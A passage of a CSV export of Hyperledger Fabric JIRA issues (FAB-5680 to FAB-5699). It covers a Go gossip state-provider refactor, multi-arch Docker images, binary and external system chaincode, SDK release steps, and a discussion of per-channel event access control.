func NewGossipStateProvider(chainID string, g GossipAdapter, committer committer.Committer, mcs api.MessageCryptoService) GossipStateProvider
{code}

Later this needed to be extended to include also identity mapper capabilities, to be able to identify from whom to request specific private collection. Therefore instead of adding new parameter into state constructor function, it will be much convenient to capture needed capabilities into intermediate struct which will serve as an adapter for required APIs allowing more powerful and fine grained control. For example:

{code}
// GossipAdapter defines gossip/communication required interface for state provider
type GossipAdapter interface {
	// Send sends a message to remote peers
	Send(msg *proto.GossipMessage, peers ...*comm.RemotePeer)

	// Accept returns a dedicated read-only channel for messages sent by other nodes that match a certain predicate.
	// If passThrough is false, the messages are processed by the gossip layer beforehand.
	// If passThrough is true, the gossip layer doesn't intervene and the messages
	// can be used to send a reply back to the sender
	Accept(acceptor common2.MessageAcceptor, passThrough bool) (<-chan *proto.GossipMessage, <-chan proto.ReceivedMessage)

	// UpdateChannelMetadata updates the self metadata the peer
	// publishes to other peers about its channel-related state
	UpdateChannelMetadata(metadata []byte, chainID common2.ChainID)

	// PeersOfChannel returns the NetworkMembers considered alive
	// and also subscribed to the channel given
	PeersOfChannel(common2.ChainID) []discovery.NetworkMember
}

// MCSAdapter adapter of message crypto service interface to bound
// specific APIs required by state transfer service
type MCSAdapter interface {
	// VerifyBlock returns nil if the block is properly signed, and the claimed seqNum is the
	// sequence number that the block's header contains.
	// else returns error
	VerifyBlock(chainID common2.ChainID, seqNum uint64, signedBlock []byte) error

	// VerifyByChannel checks that signature is a valid signature of message
	// under a peer's verification key, but also in the context of a specific channel.
	// If the verification succeeded, Verify returns nil meaning no error occurred.
	// If peerIdentity is nil, then the verification fails.
	VerifyByChannel(chainID common2.ChainID, peerIdentity api.PeerIdentityType, signature, message []byte) error
}

// ServicesMediator aggregated adapter to compound all mediator
// required by state transfer into single struct
type ServicesMediator struct {
	GossipAdapter
	MCSAdapter
}
{code} 

Which will allow to change signature of the constructor to 
{code}
func NewGossipCoordinatedStateProvider(chainID string, services *ServicesMediator, coordinator Coordinator) GossipStateProvider 
{code}

and use it in following way:

{code}
	servicesAdapater := &state.ServicesMediator{GossipAdapter: g, MCSAdapter: g.mcs}
	stateProvider := state.NewGossipStateProvider(chainID, servicesAdapater, committer)
{code}",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycgn:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
use Docker multi-arch registry support,FAB-5680,20067,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,rameshthoomu,ChristopherFerris,ChristopherFerris,09/Aug/17 11:27 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,20/Jul/18 11:06 PM,v1.0.0,,,Future,,fabric-build,,,,,,0,,,,,,,"We should avail ourselves of using Docker's support for multi-architectures in the registry. This would make the image tag names more manageable. 

e.g. instead of:
ppc64le-1.0.0    88 MB     a month ago
x86_64-1.0.0     72 MB     a month ago
s390x-1.0.0       76 MB     a month ago
ppc64le-1.0.0-rc1     88  MB     2 months ago
x86_64-1.0.0-rc1      72 MB      2 months ago
s390x-1.0.0-rc1        76 MB      2 months ago
 
We could simply have:
1.0.0     88 MB     a month ago
1.0.1     88 MB     a week ago
 
and `docker pull` would pull down the correct architecture image
 ",,ChristopherFerris,rameshthoomu,sanchezl,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6262,,,,,,,,,,,,,,,,,,,,FAB-8338,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-10068,,,,,,,,,"1|hzychb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,rameshthoomu,sanchezl,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Mar/18 6:06 AM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/18467/;;;","23/Mar/18 6:21 AM;rameshthoomu;More discussion/comments are placed in FAB-8338. Marking this as related to FAB-8338;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BINARY user CC - Implement code changes in fabric,FAB-5682,20069,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sudeshrshetty,aleksandar.likic,aleksandar.likic,10/Aug/17 1:05 AM,11/Jan/19 9:52 PM,28/Oct/23 3:00 AM,28/Oct/17 2:00 AM,,,,Abandoned,,fabric-peer,,,,,,0,chaincode,Release-planning-1.1,,,,,,,aleksandar.likic,k.ramankishore,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABG-449,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5460,,,,,,,,,"1|hzx0kn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,k.ramankishore,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Aug/17 1:47 AM;troyronda;Regarding the multi-arch discussion initiated in gerrit.

One of the initial thoughts on handling multi-arch was to include cross-compiled versions of all the consortium's supported platforms in the package sent by install. However, it was viewed as less complex to simply include one target architecture.

Since the install command is targeted to a particular peer, the client needs to send the appropriate architecture within each individual call to install@peer. Effectively some of the complexity to the administrative client to select the correct package to send to the peer (and to expose each peer's architecture via config and discovery).

Regarding the llvm discussion initiated in gerrit.

I think that supporting some additional platforms via byte code has merit as additional stories. However the binary approach offers flexibility, less initial complexity, and allows for more obvious (production) support of precompiled Go codebases. So I think the byte code idea doesn't replace the binary option that was done as the first implementation.

Really the platform should simply support the consortium's choices in how to apply their business processes to the current state. Those processes meet an interface and the gears turn :).  It's up to each consortium to determine their own policies around source distribution, code review, implementation certification.;;;","11/Jan/19 9:31 PM;k.ramankishore;I'm sorry if I'm asking a redundant question.

Was this change implemented? Can users install pre compiled binary chaincode now by adding the flag ""-l binary"" to peer install command?

Is there any documentation for this?;;;","11/Jan/19 9:52 PM;k.ramankishore;If this is not implemented, can someone please explain me the thought process behind taking this decision?

Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BINARY user CC - Fabric documentation,FAB-5683,20070,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sudeshrshetty,aleksandar.likic,aleksandar.likic,10/Aug/17 1:12 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,08/Nov/17 11:35 PM,,,,Abandoned,,,,,,,,0,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5460,,,,,,,,,"1|hzychr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SCC Persistence - Implement code change in fabric,FAB-5684,20071,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,aleksandar.likic,aleksandar.likic,10/Aug/17 1:32 AM,23/Jan/20 6:59 AM,28/Oct/23 3:00 AM,23/Jan/20 6:59 AM,,,,,,,,,,,,0,stale-item,,,,,,,,aleksandar.likic,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzychz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:59 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SCC Persistence - Fabric documentation,FAB-5685,20072,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,aleksandar.likic,aleksandar.likic,10/Aug/17 1:32 AM,23/Jan/20 6:59 AM,28/Oct/23 3:00 AM,23/Jan/20 6:59 AM,,,,,,,,,,,,0,stale-item,,,,,,,,aleksandar.likic,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyci7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:59 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update protolator to support the new resource config type,FAB-5686,20073,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,10/Aug/17 2:00 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,fabric-tools,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycif:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stub out resource definitions for configtxgen,FAB-5687,20074,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,10/Aug/17 2:04 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,fabric-tools,,,,,,0,,,,,,,"The RSCC Seed Data must be provided via the configtx which creates the channel.  For now, we should simply provide a default of sane values here, and consider a user configurable interface later.  The user may always modify the defaults with configtxlator/protolator.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycin:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External (Out of Process) SCC,FAB-5688,20075,,Epic,Closed,FAB,Fabric,software,denyeart,,,High,Done,,aleksandar.likic,aleksandar.likic,10/Aug/17 2:45 AM,21/Jul/18 4:09 AM,28/Oct/23 3:00 AM,06/Nov/17 10:00 PM,v1.0.0,,,WON'T FIX,,fabric-peer,,,,,,0,,,,,,,"Fabric 1.0 supports adding new features to the platform via System Chaincodes (SCCs). Currently, this approach requires embedding a new SCC code (that implements a new functionality) into the peer code base and recompiling the peer.

In the future, it may be possible to leverage dynamic binding feature in Go (1.8 has added some support), so adding the new SCC will not require recompiling the peer. However, those plugin SCCs still run in the same process with the peer. This proposal introduces a new class of SCCs that run outside of the peer process - hence the name External SCCs.

Design: [https://docs.google.com/document/d/1NXz8fraX3O6PkXrcNyXklNHWZG-UeXHad0yUuP34f7w/edit#|https://docs.google.com/document/d/1NXz8fraX3O6PkXrcNyXklNHWZG-UeXHad0yUuP34f7w/edit]

Working proof of concept against v1.0.0 is at [https://github.com/securekey/fabric-next|https://github.com/securekey/fabric-next.] (this repository has also some other changes, like https://jira.hyperledger.org/browse/FAB-5460).

To keep the complexity of the change low and the scope of v1.1 small, we propose that we migrate to master only the changes required to have:
 * SCC distributed as precompiled binary (using the same solution as in https://jira.hyperledger.org/browse/FAB-5460)
 * SCC running as a process in the same container along side the peer

v1.1 scope in:
 * chaincode type = BINARY (relies on https://jira.hyperledger.org/browse/FAB-5460)
 * execution environment = SYSTEM_EXT

v1.1 scope out:
 * chaincode type other than BINARY
 * execution environment DOCKER",,aleksandar.likic,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2454,FAB-5671,,,FAB-5487,FAB-5460,FAB-6719,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,ghx-label-1,,External (Out of Process) SCC,To Do,,,Unset,,,,"1|hzycj3:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,aleksandar.likic,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Nov/17 10:00 PM;mastersingh24;I'm marking this one as WON'T fix.   FAB-6719 adds support for building SCC as Go plugins.  So with that capability, you can implement any logic you'd like and choose to run the SCC in process (default) or have your SCC plugin manage an external process.  But there will be no special type of external SCC.;;;","06/Nov/17 10:03 PM;mastersingh24;This is being done instead;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External SCC - changes to peer runtime,FAB-5689,20076,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,emir.heidinger,aleksandar.likic,aleksandar.likic,10/Aug/17 2:57 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,28/Oct/17 2:02 AM,,,,Abandoned,,fabric-peer,,,,,,0,,,,,,,"A new, SYSTEM_EXT execution environment will be defined, in addition to the existing DOCKER and SYSTEM.

To support the SYSTEM_EXT execution environment, we will add a new implementation of the VM interface, extcontroller (alongside the existing VM implementations).

 ",,aleksandar.likic,baohua,denyeart,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5688,,,,,,,,,"1|hzycjb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,baohua,denyeart,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/17 4:24 PM;baohua;Hi aleksandar, would u like to give more info or refs on the SYSTEM_EXT env?
Thanks!;;;","07/Sep/17 12:26 AM;denyeart;We only label the top level JIRA item for a release.  Since FAB-5688 is the covering Epic, I'll remove the release planning tag for this one.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External SCC - Example,FAB-5690,20077,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,aleksandar.likic,aleksandar.likic,10/Aug/17 2:58 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,06/Nov/17 9:56 PM,,,,Abandoned,,,,,,,,0,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5688,,,,,,,,,"1|hzycjj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External SCC - Fabric documentation,FAB-5691,20078,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,aleksandar.likic,aleksandar.likic,10/Aug/17 2:58 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,06/Nov/17 9:57 PM,,,,Abandoned,,,,,,,,0,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5688,,,,,,,,,"1|hzycjr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External SCC - Packaging (for deployment),FAB-5692,20079,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,emir.heidinger,aleksandar.likic,aleksandar.likic,10/Aug/17 2:59 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,06/Nov/17 9:57 PM,,,,Abandoned,,,,,,,,0,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5688,,,,,,,,,"1|hzx0kf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create 1.0.1 patch for fabric-sdk-node,FAB-5693,20080,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,jimthematrix,jimthematrix,10/Aug/17 4:41 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Aug/17 9:13 PM,,,,v1.0.1,,fabric-sdk-node,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycjz:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Aug/17 5:05 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/12299/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release fabric-sdk-node 1.0.1,FAB-5694,20081,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,jimthematrix,jimthematrix,10/Aug/17 4:48 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Aug/17 9:12 PM,,,,v1.0.1,,fabric-sdk-node,,,,,,0,,,,,,,"Change version in fabric-client/package.json and fabric-ca-client/package.json to ""1.0.1""

release_notes/v1.0.1.txt should be updated
change log should be generated just after rebasing to pick up the last minute merged CRs and linked from release_notes/v1.0.1.txt ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyck7:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Aug/17 5:05 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/12301/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel Service for events,FAB-5695,20082,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,10/Aug/17 4:55 AM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,Abandoned,,fabric-peer,,,,,,1,,,,,,,"The current event framework found in fabric/events registers clients for events at the peer level and not at the channel level. This means that a client receives all events from the peer (that they are interested in). Adding ACL checks to this framework in addition to being unwieldy would also create a processing overhead, as we'd have to cycle through every client for every event whether they are interested in the channel or not.  A better approach would be to have clients register on events on a channel basis. While this could be done by extending the event framework, adding a channel level context  with ACL support on the peer wide framework is clugy.

A new channel service could be implemented on the peer endpoint to prepare for future ACL on events. A client would register with a peer for events from a specific channel. ACL policies will then determine if the client should be given access to events (and which type of events).",,denyeart,Hangyu_FJH,holocron,jyellick,mastersingh24,muralisr,peoplehlj,rickr,ScottMoynes,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6243,,,,,,,,,,,,,,,,FAB-5481,FAB-6591,,,FAB-6911,FAB-6451,,,,,,,,,,,"09/Jan/18 4:36 AM;yacovm;Capture.PNG;https://jira.hyperledger.org/secure/attachment/14112/Capture.PNG",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyckf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,Hangyu_FJH,holocron,jyellick,mastersingh24,muralisr,peoplehlj,rickr,ScottMoynes,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/17 11:03 PM;yacovm;{quote}This means that a client receives all events from the peer (that they are interested in).{quote}
I don't understand - this is in contrast to receiving events from all peers in the channel? Is the goal here to have a distributed event service that would propagate events from peers to other peers and then to clients?

{quote} Adding ACL checks to this framework in addition to being unwieldy would also create a processing overhead{quote}
Why? You check if the client is eligible for receiving events for the type that it requests at subscription time, and then upon config update - you revalidate this subscription.
The orderer does just that ( [~jyellick] correct me please if I'm wrong) for *Deliver*.

{quote} as we'd have to cycle through every client for every event whether they are interested in the channel or not.{quote}
This is an implementation detail, no? If we pass the event in the subscription message the client sends, we won't have to - unless I'm missing something

{quote}While this could be done by extending the event framework, adding a channel level context  with ACL support on the peer wide framework is clugy.{quote}
Why?

{quote}A new channel service could be implemented on the peer endpoint to prepare for future ACL on events{quote}
I don't understand why we need a new gRPC service for this. 
Why can't we just expand the [event proto|https://github.com/hyperledger/fabric/blob/release/protos/peer/events.proto] with a channel?




;;;","12/Aug/17 12:35 AM;jyellick;> Why? You check if the client is eligible for receiving events for the type that it requests at subscription time, and then upon config update - you revalidate this subscription.
> The orderer does just that ( Jason Yellick correct me please if I'm wrong) for Deliver.

Absolutely correct.  The APIs are already built to invoke callbacks on changes, so this is very easy to implement within the configuration/policy framework.  Simply re-validate any existing subscriptions on change, and the overhead should be minimal.;;;","12/Aug/17 1:36 AM;mastersingh24;This really comes down to the fact that the existing eventHub was actually designed as an integration endpoint and not as an endpoint for notifying clients if transactions were successful.  But back in v0.6 days we started down this path and it has continued to date.

There are 2 common event cases:

1) (MOST COMMON) Clients simply want to be notified that their transactions have been committed and/or if there were any failures

2) Integration with legacy / enterprise applications (less common but the original intent of the eventHub)

So when the requirement came up to start to limit access to events (specifically for clients and transactions by channel), it made sense to me that we should start with a fresh service and build up from there rather than try to keep misusing the original service.  And while we can technically bind the same service to multiple endpoints, it also does not make sense that clients should have to connect to a different endpoint to get response for transactions nor does it make sense that the endpoint for enteprise integration be exposed publicly;;;","12/Aug/17 2:56 AM;muralisr;+1 to [~mastersingh24] ...would be gilding the lily to add more.;;;","12/Aug/17 3:02 AM;yacovm;{quote}1) (MOST COMMON) Clients simply want to be notified that their transactions have been committed and/or if there were any failures{quote}
If that's any use - we have a [pub sub|https://github.com/hyperledger/fabric/blob/release/gossip/util/pubsub.go] implementation in gossip;;;","03/Oct/17 8:37 PM;yacovm;Another important thing - we need a way to make the channel service to re-evaluate all connected clients in terms of access control- when a config update (or, when RSCC is merged - also an RSCC update) happens - the service needs to re-compute policies regarding to all registrations of connected clients.

I currently don't see such support in the ACL related change set. 
* We need to save the signed events in some data structure in the server.go and whenever there is a config update, we need to re-evaluate all subscriptions. 
* We need to provide a method of providing the channel service with a callback that would notify a config update has happened. [~jyellick]'s config framework [provides such a thing|https://github.com/hyperledger/fabric/blob/master/core/peer/peer.go#L293-L298].
* I also think that since we're building this now, we might as well address the server-side support for the [transferable events|https://jira.hyperledger.org/browse/FAB-4824] which isn't included in the change set series. 

[~wlahti] ;;;","03/Oct/17 9:08 PM;wlahti;Agreed on all points.

In regards to reevaluating after an update, that's why I created subtask FAB-6160. The last I was aware, the ability to update RSCC policies hadn't yet been implemented. 

For the event relay security hole, yes, I think I can reincorporate that CR (updating it according to the latest JIRA discussion) into this series of CRs now that the concerns expressed by Murali have been responded to by Elli.

 ;;;","03/Oct/17 9:11 PM;yacovm;We need to re-evaluate also upon config update, not just RSCC update. 
Can you perhaps change FAB-6160 to include that? 

Edit: I see you have. thanks.

So, I think we need JIRA sub-task(s) to handle the bullets I outlined.

I'd like to help at least with the design, would you like to sync with me on this?;;;","28/Nov/17 8:31 PM;denyeart;This is now being implemented using Deliver API (FAB-6911).;;;","08/Dec/17 12:54 AM;wlahti;Marking this item as done now that the Deliver service is available on the peer via FAB-6911. ;;;","09/Jan/18 4:41 AM;yacovm;Sorry for the thread necromancy, but this comment by me which [~wlahti] said that he added to this JIRA, should have migrated to the peer deliver service ( good thing [~C0rWin] mentioned it in gerrit because I think everyone (including me) forgot about it ).

 

We currently have no way of detecting an RSCC policy ACL update, which means that if a client is connected to the peer's deliver service (or to the legacy event service ? Do we use that there too?) and the policy changes such that it it should have not been able to connect if he had re-connected - then we need:
 * A way to detect this reconfiguration
 * To connect this to the peer and act accordingly.

 

 

Or - I could be wrong and the ability to update the ACL isn't implemented / supported from some reason (I don't know)

 

!Capture.PNG|thumbnail!;;;","09/Jan/18 5:14 AM;yacovm;Actually I might be wrong and we have [this thing|https://github.com/hyperledger/fabric/blob/master/core/peer/peer.go#L328-L334] here that can be used for this.

 

[~jyellick] can you confirm ?;;;","09/Jan/18 5:15 AM;denyeart;Thanks for the reminder [~yacovm].  Accordingly I have moved FAB-6160 for the event re-evaluation over to the Deliver Service JIRA item - FAB-6911.  It sounds like there is infrastructure in place to register to resource bundle changes, which can then be used for the event re-evaluation.;;;","09/Jan/18 6:42 AM;yacovm;So,  [~jyellick] came up with a really neat idea how to make this change easily using his resource config bundle code.

I implemented it in [https://gerrit.hyperledger.org/r/#/c/16677/];;;",,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric-sdk-node for 1.0.2 release,FAB-5698,20085,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,jimthematrix,jimthematrix,10/Aug/17 5:22 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Aug/17 6:40 PM,,,,,,fabric-sdk-node,,,,,,0,fabric-sdk-rest,,,,,,"change version in package.json files to ""1.0.2-snapshot""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycl3:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unable to install packages from fabric-chaincode-node repo,FAB-5699,20086,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,10/Aug/17 5:48 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Aug/17 4:17 AM,,,,v1.1.0,,,,,,,,0,node-SDK,,,,,,"getting below error while executing `npm install` from fabric-chaincode-node root directory.
{code:java}
00:12:27.335 npm ERR! addLocal Could not install /w/workspace/fabric-chaincode-node-verify-x86_64/gopath/src/github.com/hyperledger/src{code}
Observed extra ../src in the below line causing above error

https://github.com/hyperledger/fabric-chaincode-node/blob/906a87ca58fe5b0943f321806e54eb9b297a5090/package.json#L13",Jenkins,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyclb:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,release-2.4,purge-pd,main-emeritius,main,correct-nodeenv-version,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Aug/17 4:17 AM;rameshthoomu;patch has been submitted and merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
